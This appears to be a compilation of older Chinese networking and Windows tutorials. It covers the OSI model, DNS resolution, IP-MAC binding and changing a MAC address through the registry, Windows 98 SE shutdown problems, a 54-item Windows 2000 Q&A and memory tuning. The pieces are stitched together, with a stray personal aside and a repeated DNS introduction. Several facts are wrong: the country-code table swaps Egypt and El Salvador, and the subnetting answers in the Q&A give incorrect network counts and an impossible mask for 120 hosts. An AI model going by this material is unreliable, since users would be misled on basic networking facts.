连网的目的在于支持运行于不同计算机的进程进行通信，而这些进程则是为用户完成不同
任务而设计的。可能的应用是多方面的，不受网络结构的限制。应用层（ application layer）包
含大量人们普遍需要的协议。虽然，对于需要通信的不同应用来说，应用层的协议都是必须的。
例如， P C机用户使用仿真终端软件通过网络仿真某个远程主机的终端并使用该远程主机的
资源。这个仿真终端程序使用虚拟终端协议将键盘输入的数据传送到主机的操作系统，并接收
显示于屏幕的数据。
再比如，当某个用户想要获得远程计算机上的一个文件拷贝时，他要向本机的文件传输软
件发出请求，这个软件与远程计算机上的文件传输进程通过文件传输协议进行通信，这个协议
主要处理文件名、用户许可状态和其他请求细节的通信。远程计算机上的文件传输进程使用其
他特征来传输文件内容。
由于每个应用有不同的要求，应用层的协议集在I S O / O S I模型中并没有定义，但是，有些确
定的应用层协议，包括虚拟终端、文件传输、和电子邮件等都可作为标准化的候选 
终于写完啦~~~~~~哈哈哈！庆祝一下，自己去买个冰淇淋吃去~~~~HOHO~ 
结尾 
值得注意的是， O S I模型本身不是网络体系结构的全部内容，这是因为它并未确切地描述用
于各层的协议和实现方法，而仅仅告诉我们每一层应该完成的功能。不过， I S O已经为各层制定
了相应的标准，但这些标准并不是模型的一部分，它们是作为独立的国际标准而被发布的。
在O S I参考模型中，有三个基本概念：服务、接口和协议。也许O S I模型的最重要的贡献是
将这三个概念区分清楚了。
O S I参考模型是在其协议开发之前设计出来的。这意味着O S I模型不是基于某个特定的协议
集而设计的，因而它更具有通用性。但另一方面，也意味着O S I模型在协议实现方面存在某些不
足。实际上，O S I协议过于复杂，这也是O S I从未真正流行开来的原因所在。
虽然O S I模型和协议并未获得巨大的成功，但是O S I参考模型在计算机网络的发展过程中仍
然起到了非常重要的指导作用，作为一种参考模型和完整体系，它仍对今后计算机网络技术朝
标准化、规范化方向发展具有指导意义。
DNS 系统解析过程概述
DNS（Domain Name Servive，域名服务）是Internet/Intranet中最基础也是非常重要的一项服务，提供了网络访问中域名到IP地址的自动转换。我们知道，Inetrnet上的主机成千上万，并且还在随时不断增加，不可能由一个或几个DNS服务器能够实现这样的解析过程，传统主机表（hosts）方式更无法胜任，事实上DNS依靠一个分布式数据库系统对网络中主机域名进行解析，并及时地将新主机的信息传播给网络中的其它相关部分，因而给网络维护及扩充带来了极大的方便。  
正文:    　　　　　　 　　　 　　　　 DNS 系统解析过程概述 
　　DNS（Domain Name Servive，域名服务）是Internet/Intranet中最基础也是非常重要的一项服务，提供了网络访问中域名到IP地址的自动转换。我们知道，Inetrnet上的主机成千上万，并且还在随时不断增加，不可能由一个或几个DNS服务器能够实现这样的解析过程，传统主机表（hosts）方式更无法胜任，事实上DNS依靠一个分布式数据库系统对网络中主机域名进行解析，并及时地将新主机的信息传播给网络中的其它相关部分，因而给网络维护及扩充带来了极大的方便。
　　DNS提供的服务就是要将人们所熟悉的名字映射成IP地址。一般有两种机制来完成,一种是有主机表来完成,另一种是采用域名服务的守护进程(named , 或 in.namd)来实现。这两种方式都能实现域名与IP之间的互相映射。
目前的IP地址与域名由谁分配？Internet的最高层域名由Internet网络协会负责网络地址分配的委员会进行登记和管理，它还为Internet的每一台主机分配唯一的IP地址。全世界现有3个大的网络信息中心： 
INTER NIC 负责美国及其它地区
RIPE-NIC 负责欧洲地区
APNIC 负责亚太地区 
DNS 层次结构
DNS是一个很复杂的概念，在了解DNS结构之前，让我们先掌握一些有关DNS 的一些常用术语。
表1列出了常用的DNS术语。 
术语 说明 
域 代表网络一部分的逻辑实体或组织 
域名 主机名的一部分，它代表包含这个主机的域。它可以和域交换使用 
主机 网络上的一台计算机 
节点 网络上的一台计算机 
域名服务器 提供DNS服务的计算机，它将DNS名字转化为IP地址 
解析 把一个DNS服务器转化为与其相映的IP地址的过程 
解析器 从域名服务器中提取DNS信息的程序或库子程序 
反向解析 将给出的IP地址转化为其相映的DNS名字 
欺骗 使网络看上去好象具有不同的IP地址或域名的行为 
表1 常用DNS术语
　　好了，掌握了上面的一些术语以后，让我来介绍一下DNS的层次结构，以便能让大家更深刻的认识DNS的整个体系结构和了解DNS 系统的解析过程。 DNS实际上是一个分布式的数据库系统,它是有层次结构的系统,DNS并没有一张保存着所有的主机信息的主机表，相反，这些信息是存放在许多分布式的域名服务器中，这些域名服务器组成一个层次结构的系统，顶层是一个根域（root domain），它使用符号点号" . "来表示。其实，域的概念和我们地理上的行政区域管理的概念是类似地，一个国家行政机构包括中央政府，（就相当于根域）和各个省份的省政府（第一级域名），省政府之下又包括许多市政府（第二级域名），市政府之下包括许多县政府（第三级域名），等等依次类推，每一个下级子域都是上级域的子域。每个域都有自己一组的域名服务器，这些服务器中保存着当前域的主机信息和下级子域的域名服务器信息。例如根域服务器不必知道根域内所有主机的信息，它只要知道所有子域的域名服务器的地址即可。
图2表示了域名的层次结构： 
图 2 DNS的 层次结构　　
　　在图2中包括了地理域和机构域两种类型，其中地理域是以中国为例说明的，机构域是以com举例说明的。如上图所示，www.china-pub.com 标明了Internet上的一个主机,com是一级域,china-pub是二级域,www,mail,dns都是主机名,用以标明主机的服务类型。这个例子就形象的说明了域名系统的层次结构和分层管理机制。
第一层域（即顶级域名）一般有两种类型，一种是地理域，另一种是机构域，地理域是通过地理区域来划分域名，例如中国的地理域名是CN,日本是JP,香港是HK,美国一般不使用地理域名；机构域是根据注册的机构类型来分类。
常用机构类的顶级域名为：
域名 机构的类型
.GOV 政府机构
.EDU 教育机构
.INT 国际组织（如北大西洋公约组织NATO）
.MIL 军事部门
.COM 商业机构
.NET 网络中心
.ORG 社会组织、专业协会
表3
　　尽管机构名称不能告诉用户有关系统物理地点的情况，但大多数使用机构名称的系统都属于美国，不过现在有些域名（如.COM、.NET和.ORG）已可供全球申请使用。
其它机构类新型顶级域名： 
域名 机构的类型
.FIRM 商业或公司
.STORE 提供购买商品的业务部门
.WEB 主要活动和WWW有关的实体
.ARTS 以文化性娱乐活动为主的活动
.REC 以消遣性娱乐活动为主的实体
.INFU 提供信息服务的实体
.NOM 有针对性的个人或人员的命名
表4
　　（以上7个域名是Internet 国际特别委员会IAHC于1997年2月4日最新扩充的机构域名）
下面的表5中列举了一些普及地理类顶级域名：
域名 国家或地区 域名 国家或地区 域名 国家或地区 域名 国家或地区
.am 亚美尼亚 .aq 南极洲 .ar 阿根廷 .au 澳大利亚
.bb 巴巴多斯 .be 比利时 .bg 保加利亚 .ca 加拿大
.ch 瑞士 .cl 智利 .cn 中国 .cr 哥斯达黎加
.cy 塞浦路斯 .de 德国 .dk 丹麦 .ec 埃及
.eg 萨尔瓦多 .es 西班牙 .fi 芬兰 .gb 英国（官方）
.gr 希腊 .hk 香港 .hu 匈牙利 .ie 爱尔兰
.il 以色列 .in 印度 .ir 伊朗 .it 意大利
.jm 牙买加 .jp 日本 .kr 韩国 .lt 立陶宛
.lu 卢森保 .mo 澳门 .mx 墨西哥 .ni 尼加拉瓜
.nl 荷兰 .no 挪威 .nz 新西兰 .pe 贝卢
.ph 菲律宾 .pl 波兰 .pt 葡萄牙 .ru 俄国
.se 瑞典 .sg 新加坡 .si 斯洛文尼亚 .th 泰国
.tn 突尼斯 .tr 土耳其 .tw 台湾 .us 美国
.uk 英国（通用 .ve 委内瑞拉 .vn 越南 .zm 赞比亚
表5
DNS解析过程及原理
　　在上面介绍了域的概念和域的层次结构之后，就可以进一步了解DNS的工作原理和过程了，DNS的工作原理及过程分下面几个步骤：
　　第一步：客户机提出域名解析请求,并将该请求发送给本地的域名服务器。
　　第二步：当本地的域名服务器收到请求后,就先查询本地的缓存,如果有该纪录项,则本地的域名服务器就直接把查询的结果返回。
　　第三步：如果本地的缓存中没有该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根的子域)的主域名服务器的地址。
　　第四步：本地服务器再向上一步返回的域名服务器发送请求,然后接受请求的服务器查询自己的缓存,如果没有该纪录,则返回相关的下级的域名服务器的地址。
　　第五步：重复第四步,直到找到正确的纪录。
　　第六步：本地域名服务器把返回的结果保存到缓存,以备下一次使用,同时还将结果返回给客户机。
　　让我们举一个例子来详细说明解析域名的过程.假设我们的客户机如果想要访问站点：www.linejet.com , 此客户本地的域名服务器是dns.company.com , 一个根域名服务器是NS.INTER.NET , 所要访问的网站的域名服务器是dns.linejet.com,域名解析的过程如下所示:
　(1)客户机发出请求解析域名www.linejet.com的报文
　(2)本地的域名服务器收到请求后, 查询本地缓存, 假设没有该纪录, 则本地域名服务器dns.company.com则向根域名服务器NS.INTER.NET发出请求解析域名www.linejet.com
　(3)根域名服务器NS.INTER.NET收到请求后查询本地记录得到如下结果:linejet.com NS dns.linejet.com （表示linejet.com域中的域名服务器为：dns.linejet.com ）, 同时给出dns.linejet.com的地址,并将结果返回给域名服务器dns.company.com。
　(4)域名服务器dns.company.com 收到回应后,再发出请求解析域名www.linejet.com的报文。
　(5)域名服务器 dns.linejet.com收到请求后,开始查询本地的记录，找到如下一条记录: www.linejet.com A 211.120.3.12 （表示linejet.com域中域名服务器dns.linejet.com的IP地址为:211.120.3.12）,并将结果返回给客户本地域名服务器dns.company.com。
　(6)客户本地域名服务器将返回的结果保存到本地缓存,同时将结果返回给客户机。
这样就完成了一次域名解析过程， 小结
DNS是一个很复杂的概念，在我们动手搭建和配置DNS系统之前，一定要好好了解DNS 系统解析过程，这样才能不会一头雾水，只知道如何配置，却不知道为什么这样配置。
网络MAC地址
MAC地址是固化在网卡上串行EEPROM中的物理地址，通常有48位长。以太网交换机根据某条信息包头中的MAC源地址和MAC目的地址实现包的交换和传递。要搭建局域网，必须学会绑定IP与MAC地址；换了新网卡，必须学会修改MAC地址以应对不能上网的尴尬。不要让MAC地址成为你网上生活的绊脚石呦！相信通过我的介绍，大家将会对MAC地址有个全方位的了解。 
　　获取本机的MAC 
　　对于数量不多的几台机器，我们可以这样获取MAC地址：在Windows 98/Me中，依次单击“开始”→“运行” →输入“winipcfg”→回车。

　　在Windows 2000/XP中，依次单击“开始”→“运行”→输入“CMD”→回车→输入“ipconfig /all”→回车。 

　　IP与MAC的捆绑 
　　MAC地址是网卡的惟一标识，这种惟一性恰好给网络管理带来了福音，因为通过捆绑IP和MAC地址，就可以轻松防止局域网中IP地址盗用现象，阻止非法入侵者。 
　　对于动态IP，做一个DHCP服务器来绑定用户网卡MAC地址和IP地址，然后再根据不同IP设定权限；对于静态IP，如果用三层交换机的话，你可以在交换机的每个端口上做IP地址的限定，这样如果改变某台客户端的IP地址，这台PC也就不能连通网络了。 
　　以静态IP地址的绑定为例，实现一下上面的高招吧：假设此时的网卡MAC地址为44-45-53-54-00-00。假设我们在Windows 98操作系统中，启动虚拟DOS后，键入“ARP空格-s空格192.168.0.66空格44-45-53-54-00-00”，回车。这样实现了静态IP地址192.168.0.66与网卡地址为44-45-53-54-00-00的计算机的捆绑，接下来我们看看ARP常用参数表。 

　　特别提示：ARP命令仅在局域网中上网的代理服务器端有用，还要是静态IP地址。如果你是一名网络管理员，就必须对MAC地址和IP的绑定运用自如，这样才能杜绝很多隐患。 
　　MAC的大修大改 
　　MAC地址神圣不可侵犯！但是，对于更换了新网卡的朋友，难道真的就不能使用原来的IP了吗？还是有办法的。 
　　以常用的Windows 2000/XP为例：第一步，单击“开始”→“运行”→输入“Regedit”，打开注册表编辑器，按Ctrl+F打开查找窗，输入“DriverDesc”单击确定。 

　　双击找到的内容,即为你要修改的网卡的信息描述，左边数形列表显示当前主键（比如0000）。第二步，在相应的0000下新建一串值，命名为NetworkAddress，键值设为你要的MAC地址，注意要连续写，如112233445566。 第三步，重新启动计算机，你就会发现网卡MAC地址已经改变为你所设置的地址。然而，如果你要经常改换地址的话在注册表里改来改去的方法就实在是太繁琐了。不用担心，再进行下面两项修改后你就会发现以后修改MAC地址竟是如此简单！第四步，在相应的0000下的Ndi\Params中加一项，主键名为NetworkAddress，然后在该主键下添加名为default的串值，其值设为你要设的MAC地址，同样也要连续地写。第五步，在NetworkAddress主键下继续添加名为ParamDesc的字符串，其值可设为“MAC Address”。 
　　全部设置完成了，关闭注册表，重新启动计算机，打开“网络邻居”的属性，选择相应的网卡，单击“属性”选择“高级”选项卡，属性中会多出MAC Address的选项，也就是在上面第二步在注册表中添加的NetworkAddress项，以后只要在此处的设置值中修改MAC地址就可以了。 Windows 9x的修改方法很类似，在这里我们就不做讨论了。 
　　总算把MAC地址的东西完完整整地介绍给大家了。值得提醒大家的是，修改本机MAC地址前一定要把原地址记录下，或者备份注册表，否则需要原地址的时候只能重新安装了。而对于自行修改MAC地址入网，网管员还是有办法侦测出来的。因此，换网卡后别忘记跟网管打个招呼哟。
windows98se 不能关机的原因及解决方法
这种现象并不少见，而且专门针对此问题有一个补丁程序，但是好像这个补丁也不能从根本上解决问题。所以我们只能从系统的关机原理上想办法了。 
　　当Windows系统关闭时，在关机的过程中需要完成下列工作： 
　　1.完成所有的写盘作业。 
　　2.刷新磁盘缓存(Cache)。 
　　3.运行关闭窗口的代码程序，关闭所有当前正在运行的应用。 
　　4.将所有保护模式下的驱动转变成实模式。 
　　在Windows 98 SE里的关机问题有可能是由下列原因引起的，相应的解决办法如下： 
　　1.非正常关闭的应用。关机前要关闭所有正在运行的程序，包括关闭任何在实模式下加载的TSR程序、关闭开机时从启动组自动启动的程序、关闭任何非系统引导必需的第三方设备驱动程序。 
　　可以通过检查config.sys 、autoexec.bat、win.ini文件确定并删除其中加载的有关实模式程序，还可以使用Microsoft系统配置工具Msconfig.exe(在c:\windows\system目录下)检查有哪些运行的程序，取消后对系统进行干净引导(指只加载最少的驱动程序、并在启动时不运行启动组中的任何程序进行系统引导)。如果干净引导可以解决问题，你就可以利用系统配置工具确定引起不能正常关机的程序。 
　　2.安装了不兼容的、已经损坏的或者有冲突的设备驱动程序。 
　　可以对利用bootlog.txt分析。 
　　正常的最后一行一般含有EndTerminate=Kernel, win98 
　　不正常现象有： 
　　terminate=query drivers 内存管理程序问题 
　　terminate=Unload Network 与config.sys中的实模式网络驱动程序有冲突 
　　terminate=reset display 视频驱动的问题 
　　terminate=rit 声卡或鼠标驱动与计时器有冲突 
　　terminate=win32与32位程序有关的问题注册了线程 
　　3.用于退出窗口的声音文件已经被破坏。可以在“控制面板-声音”中重新选定其他声音文件或设为“无”。 
　　4.硬件设备配置不正确或者已经损坏。 
　　将任何可能引起问题的硬件删除或使之失效。 
　　可以采用下列步骤使设备管理器中的某些设备无效： 
　　进入“控制面板”，“系统”的“设备管理”标签下，双击包含你想选定的设备，单击该设备，然后单击属性。在“常规”标签下，选定“在此硬件配置文件中禁用”复选框，然后单击“确定”。 
　　重新引导系统。 
　　如果问题解决，逐个启用上述禁用的设备，并检查有没有设备冲突： 
　　在设备管理器中双击包含你想选定的设备，单击该设备，然后单击属性。 在“常规”标签下逐个启用上述禁用的设备。在“资源”标签下检查“冲突的设备列表”的内容。注意，并非所有设备都有“资源”标签。 
　　如果通过上述步骤，确定了是某一个硬件引起非正常关机问题，应与该设备的代理商联系，或者通过Internet与厂商联系，以更新驱动程序。 
　　如果问题仍然没有解决，可以单击“开始>程序>附件>系统工具>系统信息”然后单击“工具”菜单，单击“自动跳过驱动程序代理”工具以启用所有被禁用设备的驱动程序。 
　　5.BIOS配置不正确。 
　　在PnP/PCI Configurations选项中，有一项Assign IRQ VGA，如果你装的是Win98SE版本，关不了机，跟这个选项可能有关，要把它打开。 
　　6.由于高级电源管理或者高级配置和电源接口(Advanced Configuration and Power Interface)的设置不正确。 
　　Windows 98 SE包含最新的Advanced Configuration and Power Interface(ACPI)、OnNow and Advanced Power Management(APM)。可以检查“系统-设备管理器-系统设备”是否有这些项目，如果没有，就要刷新或重新安装。再检查“高级电源管理”的设置是否正确。 
　　7.注册表中定义了快速关闭系统功能。请依次选择“开始/程序/附件/系统工具/系统信息/工具/系统配置实用程序/高级”，并选中“禁用快速关机”。而Windows 98SE中解决的方法也可以运行MSCONFIG程序，在禁用快速关机前打钩。 
　　也可以修改注册表，只要把HKEY_LOCAL_MACHINE\system\currentControlSet\control\shutdown下面FastReboot的值由“1”改为“0”就可以了。 
　　8.一些现存的计算机也许需要升级BIOS才能完全支持Windows 98 SE。
WINDOWS 2000技术的54个问与答
WINDOWS 2000技术的54个问与答
网上收集 
1、请问能否将域本地组加入其它域的全局组中？
答：可以加入全局组的有通用组,全局组和域本地组. 
2、administrators成员能不能用同一个帐号创建share folder和Dfs root?
答：ADMINISTRATOR的权利在W2K中是最大的。除非通过GP进行限制。 
3、POWER USER组能创建打印机吗？
答：在PROFESSIONAL和SERVER，ADVANCED SERVER中可以用POWER USER创建打印机。提升为DC上就不在有POWER USER。 
4、反成员资格“是什么意思？
就是一个组所拥有的成员。 
5、我登陆的时候说不允许从我这台计算机登陆。
有登陆限制！！限制了你在哪一台计算机登陆。在DC的帐户属性中，的ACCOUNT选项中的LOGON TO 中可以设定从域中的哪一台计算机登陆。1.怎样安装活动目录?
答：通过开始菜单，选择“运行--输入DCPROMO” 
6.NTFS分区的权限设置以共享处权限为标准?还是以安全性权限为标准?
答：NTFS分区设置目录权限时，从本地访问是以本地安全处设置的权限为标准，如果从网络访问就是两个取小。、 
7.NT4.0支持那些文件系统格式?WINDOWS 2000又支持那些文件系统格式?
答:NT4.0支持FAT、NTFS文件系统格式。
WINDOWS 2000支持FAT、FAT32、NTFS文件系统格式。 
8.建立条带卷是否要用相同的硬盘?
答：可以使用不同的硬盘建立条带卷。 
9.磁盘镜像的优点?
答：1.可以保护系统磁盘分区和引导磁盘分区。
2.镜像具有良好的读性能。 
10.建立RAID-5卷最少要多少个硬盘？
答：最少需要3个硬盘。 
11.在终端服务客户机要显示"开始"菜单应该用什么快捷键?
答:ALT+HOME 
12.建立拨号连接的步骤?
答: 1.安装调制解调器
2.单击"开始",指向"设置",然后单击"网络和拨号连接".
3.在"网络和拨号连接"窗口中,双击"建立新连接".
4.单击"拨号到专用网络" 或者 "拨号到INTERNET",输入电话号码等.
5.单击完成. 
13.DFS根有那两种类型?
答:有独立存在的DFS根和基于域的DFS根. 
14.文件加密的密钥是存放在什么位置的?
答:文件加密的密钥是放在文件头标的Data Decryption Field和
Data Recovery Field中. 
15问：有一部分人的帳號無法登入server 但有時又可以
答：有可能是你设置了时间限制。 
16 问：提示信息為帳號密特碼錯誤或嗣服器拒絕登入,但通過尋求電腦的方式又可以使用server的資源? 
答：因为服务器的用户名和口令，和当前进入系统的用户名和口令是一样的。 
17 问：CAL 是什么意思？ 
答：购买客户防问许可证。 
18 问：怎样理解域目录树共用连续的名字空间能给个例子吗？
答：如au.contoso.msft 与contoso.msft 
19 问：那au.contoso.msft 与contoso.msft连续？
答：是连续的。 
20问：什么是单一控制与多域控制？
答：就是只有一个域与多个域， 
21问：OU怎么理解？
答：OU表示组织单元。 
22问：请问如何实现VPN？
答：配置通过INTERNET连接到专用网。 
23:对计算机的性能进行检测的时候，“计数器“产生的日志如何察看？最好能把每一种格式对应的察看工具都列出来。 
性能日志可以分为CSV,TSV,二进制和二进制循环.CSV可以用电子表格软件查看,如EXCEL,TSV可以用文本编辑工具查看。 
24 不能举个插接站(docking station)的实例？ 
插接站是一种用来拓展笔记本电脑和膝上型电脑的拓展组件。 
25 建立"直接连接到另一个计算机"主要用在什么情况？有什么好处？ 
直接连接到另一个计算机是指两台计算机通过COM端口进行计算机通信的方法，其受COM端口速率限制最大为115200BPS。注意，这时候这种方法不需要使用网卡。 
26 "VPN连接"与普通的拔号连接有什么主要区别？只是省钱吗？省在什么地方？ 
VPN是VISAL PRIVATE NETWORK 的缩写，见附图。蓝色是ＰＳＴＮ拨号到企业ＲＡＳ，而黑色的粗线条表示通过ＶＰＮ连接到企业的网络。这种方式可以提供更高的安全性，如果是人员出差到外地就更可以剩下长途话费。而只需支付上网费和到ＶＰＮ的租用费用。 
27 问：“热修复“是什么意思？能不能举个例子？. 
答：见过针对某一个问题的补丁吗??这就可以算是一个HOTFIX. 
28 怎样更改打印机的Spool? 
答：Spool意思为打印机缓冲池，可以加快打印速度，打印机缓冲池中的打印设备可以不一样，但是必须使用相同的打印机驱动程序。打印机缓冲池由一个打印机组成，通过打印服务器的多个打印端口连接到多个打印设备。 
创建打印机缓冲池：打开打印机的”属性”对话框，在”端口”选项卡下，选择”启用打印机缓冲池”。 
更改打印机缓冲池：打开打印机的”属性”对话框，在”高级”选项卡下，在”Spool文件夹中”，键入相应的缓冲池文件夹的目录所在位置。 
29 问：224.224.224.224属于D类地址，其子网掩码为多少？ 
答：224.224.224.224属于D类地址，D类地址保留作为多播使用，其没有ABC类所固有的子网掩码。但在局域网中可以根据你自己的设置而定，所谓的ABCDE类只是传统的分类，将逐步被IPV6、CIDR和VLSM所淘汰。 
30 问：测试TCP/IP配置最常用工具是Ipconfig、Ping和Nslookup中的哪两个？ 
答：三个工具都常用，但最常用应该是Ipconfig和Ping。Ipconfig具体测试TCP/IP的配置（如IP地址、默认网关地址、DNS、WINS地址、子网掩码、MAC地址），而Ping则主要测试网络连通性。 
31 问：IP地址可分为ABCDE五类，如192.168.1.10本属于C类地址，但有了子网掩码后，IP地址的分类就无效了，例如，子网掩码为255.255.0.0,那么上述地址就变成了B类地址,是这样吗? 
答：它们分类依然是存在的，只是其具体的掩码变了，这样做的目的是为了解决以住IP地址分类的局限性所带来的缺陷，这样可以节约IP地址空间，使IP地址的分配和管理更加灵活。 
32 问：帧中继的传输速度是多少？ 
答：帧中继的传输速度可以达到155-622M，可以达到其线路所能提供的带宽的速度。 
33 问：在运行Win 98的机器中使用TCP/IP实用程序（如ARP，Ping），应该在什么地方输入？ 
答：打开”开始”菜单，进入”程序”的”附件”中的”命令提示符”。 
34 问: RPC是什么? 
答: rpc是远程进程调用 
35 问: 用户名中后缀的作用是什么? 
答: 区别一个用户可以访问的资源的作用域! 
36 问: 如果一个C类网络用掩码255.255.255.192划分子网，那么会产生多少个可用的子网？ 
答: 先将192化为二进制是:11000000,用他和C类网进行与操作,所以可以的网络号 为:XXX.XXX.XXX.10111111;XXX.XXX.XXX.11111111;XXX.XXX.XXX.01111111;XXX.XXX.XXX.00111111;有四个网络ID. 
37 问: 在同一个域中的计算机都必须中同一个IP子网中吗？ 
答: 不必!!可以是不同的子网的! 
38 问：我想让你给我解释一下子网是如何划分的。把单个的CIDR网络ID划分成较小的网络ID就不会增加路由器中路由表的数量了吗？请你给我举例说明一下，可以吗？希望你能把具体的IP地址，网络ID，子网掩码列出来。 
答：是的把单个的CIDR网络划分成较小的网络会增加路由表中的信息，CIDR是为了优化节约IP地址的分配并结合具体实际而产生的，由于IPV4 IP地址的分类的局限性使一个大于255台主机的网络都必须用一个B类地址，故造成了IP地址的巨大浪费，另一种情况就是用很多个C类地址去补，那么则造成了路由表的快速增长，但只有RIP2和OSPF路由协议支持CIDR。下面是一个具体的例子： 
如果一个公司有1500台主机，公司有一个网络ID165.223.0.0的B类网址，公司有三个部门其中总部（A）有180台PC，IT资源部（B）有1200台PC，人力资源部（C）有120台PC,你怎样优化公司的网络地址的分配。则这个题的答案为： 
A:网络ID可为165.223.1.0掩码为255.255.255.0主机IP地址范围为165.223.1.1---165.223.1.254 
B:网络ID可为165.223.2.0掩码为255.255.248.0主机IP地址范围为165.223.2.1---165.223.7.254 
C:网络ID可为165.223.8.0掩码为255.255.255.254主机IP地址范围为165.223.8.1---165.223.8.127 
如果用B类地址将造成64036个IP地址的浪费，用C类地址需要6个C类网络，则需要在路由表中增加6条记录，而用CIDR只需要三条记录，并且其它的IP地址可分配给其它的公司。 
39 问：我在WIN2000 ADVANCED SERVER 中安装内置得全拼输入法后，无法输入汉字，只能显示成小方框，OS好像又不支持其它的拼音输入法！ 
答：这个问题应该是在WORD中不能输入汉字，这可能是由于2000的BUG所引起的，但可以在其它字处理软件(如FRONTPG)中输入汉字，这样你可以在其它文档中(如FRONTPG)输入后，再复制过来排版就没有问题了。我也是这样处理的，目前确实只有这个办法。 
40 问：我的机器在不同的分区安装了winme和win2k，我想让两个操作系统的OE（outlook express）邮件共享同一文件夹,请问怎样操作。 
答：具体做法如下：打开OE--工具--选项--维护--存储文件夹--更改--输入新文件夹的位置即可。 
41 问：域和工作组的区别 
答：域和工作组都是一组计算机的逻辑组合。工作组俗称对等网络，其中没有专用的服务器。工作组中的用户帐号和计算机帐号存储在本地计算机的安全数据库中。资源的使用、管理和身份鉴定都在计算机本地进行。通常情况下工作组中的计算机数目不超过10个，且对数据安全要求不高和网络增长不大。域中计算机共享一个公共的安全数据库，用于存储安全信息。域中资源的使用、管理和身份验证都是在域控制器上集中进行。域中所有的用户帐户都存储在域控制器上。域的规模是可伸缩的。 
42 问：Single Master domain、Multiple Master domain、Complete Trust domain的区别？ 
答：单主控域是只单域结构且只有一个域控制器，多主控域指单域结构多个域控制器；完全信任域是指有明确信任关系的域。在1561B中讲得较为详细。 
43 问：请详细说明 “森林中的树共享一个公用的配置”这句话的意思。 
答：森林共享一个公用的配置即指森林中的树共享一个通用的目录架构、配置信息和全局目录。 
44 问：创建子OU需要哪些权限？ 
答：需要Read、List Contents、Create All Child Objects的权限。具有读的权限你才能够访问OU，列表的权限可以让你看见自己创建的子OU，创建所有子对象的权限能够创建子OU。 
45 问:AGGDLP是什么意思? 
答:AGGDLP是一种授权方式:具体如下:account->globle group->domain local group<-permission.这样可以比较容易的控制权限. 
46 问: 在同一个域中的计算机都必须中同一个IP子网中吗？ 
答: 不必.可以在几个IP子网. 
47问: “管理WEB站点”是不是用来管理“默认WEB站点”的？ 
答: 管理WEB站点是用来管理WEB服务器的实际上,管理WEB站点是一套ASP程序和VB脚本.其作用是远程管理WEB服务器,具体的你可以配置后使用就知道了,其实他的设置和在搞一个站点的设置方法是一样的!说的再通俗一点,是MS搞的基于ASP的网站管理脚本! 
48 问: 已知对方的IP地址，怎样才能得到它的NetBIOS名称 
答: 你可以先运行CMD.exe,然后在提示符号下输入:nbtstat -a ip 你就可以看到NETBIOS信息. 
49 问:WINS复制那些内容? 
答：WINS复制时复制WINS数据库中被标为活动的和墓碑的WINS记录。 
50 问:WINS复制的时间间隔为多久？ 
答：WINS复制时间间隔系统默认为两个小时，WINS数据库备份时间间隔系统默认为三个小时，注意这两个概念的区别。 
51问: Win2000中的Clustering，有的书称为“集群”，而有的书却称“群集”，哪一个正确？ 
答：都正确，但是“集群”，更为普遍一些。 
52问: 我用的是ADSL，但是下载速度为50—60KB，请为是否正常？ 
答：ADSL的上传速度可达640KB,最高下载速度可达9MB。由于国内目前只开通了512的ADSL带宽，还存在带宽的分割，故只有50-60KB。 
53问： 安装高级服务器时，有关“Per Server”和“Per Seat”许可证模式是安装时定,还是购买时定？ 
答：安装时定。对于每一个访问WIN2000服务器的客户机都必须要求具有一个CAL，WIN2000有两种许可证模式：Per Seat（每客户）和Per Server（每服务器）。 
Per Seat:指对访问服务器的每客户机都必须有一个CAL，则客户机可以连接到任何数目的服务器。通常这种模式应用在一个网络具有多个服务器的情况下。 
Per Server:指到服务器每一个并发（同时）连接，都需要有一个CAL，表示每一时刻服务器最大的并发连接数。通常这种模式应用在单个服务器且客户机数目相对固定的情况下。 
注意：许可证模式可从每服务器转换为每客户机，不能从每客户机转换为每服务器模式。 
54 问：使用RIS远程安装客户机，需要哪些条件？ 
答：网络服务器上必须启用了DNS服务、DHCP服务和活动目录服务，客户机方面必须满足NET PC规范、带PXE的网络适配器，或一个网络适配器和远程安装启动盘 
内存完全优化指南
于一年半前攒了台“爱机”，因当时资金有限，选择了价格较为低廉的基于威盛VIA Apollo Pro Plus芯片组的技嘉GA-6VXE主板，磁盘和内存性能受VIA芯片组的制约，相对同级的Intel BX芯片组就存在着一定差距。秉着DIY的精神，在后来的实践中，总结出一套有效的内存优化方法，使用这套方法在SiSoft Sandra的Memory BenchMark中的得分居然提高了将近一倍，像ALU这个项目优化前为116MB/s，优化后则达到了246MB/s，效果很明显。虽说还不能和现在的新型主板相提并论，但至少在原来基础上有不少提高，真是令人惊喜不已。下面就让我来把这套优化方法告诉大家。 
这张图是在没有经过优化时的测试结果（见图1）大家可以通过对比了解到优化后的好处。 
首先从内存的工作频率下手，我的主板具备内存异步的功能，因此我把内存的工作频率由原来的66MHz调整到100MHz，用软件测试发现得分提升了不少，毕竟是从66MHz变成100MHz了。然后又对内存的CL值进行调整，我们常说CAS、CL之类的术语，其实都是决定内存速度的。与内存的工作频率以及相关的有三个选项：CAS Latency、RAS to CAS Delay和RAS Precharge Time。这其中对性能影响最大的当属CAS Latency，也就是常说的CL。其实有时候也说CAS=2或者CAS=3，指的都是CL。内存在存储信息时就像一个大表格一样，通过行（Column）和列（Row）来为所有存储在内存里的信息定位，CL就是指要多少个时钟周期后才能找到相应的位置。因此CL值越小性能越好。我们将“SDRAM CAS Latency”（也有些主板上这个选项写的是“SDRAM CYCLE LENGTH”，作用是一样的）的值由“3”改为“2”。测试结果见图2。 
4路交错式运行是早期应用在高端主板市场，并用来提升内存性能的一种技术。它能提供更多的传输管道、更高的内存频宽，使内存在同一时间内能同时进行多个写/读的工作，可以有效地提升整体系统性能。在以前，我们为了打开这项功能需要使用一款名叫“WPCREdit”的软件，操作起来特别复杂，让人很烦。现在可好了！一位DIY高手为大家开发了一款专门的内存交错运行管理工具，从此操作简单到只需要执行一个.bat文件就可以了(可以到www.mydrivers.com下载，文件名是MemoryEnable.ZIP)。通过打开“Interleaving交错式运行”会产生很好的效果。我们可以通过软件观察是否调整成功（见图3），测试结果见图4。 
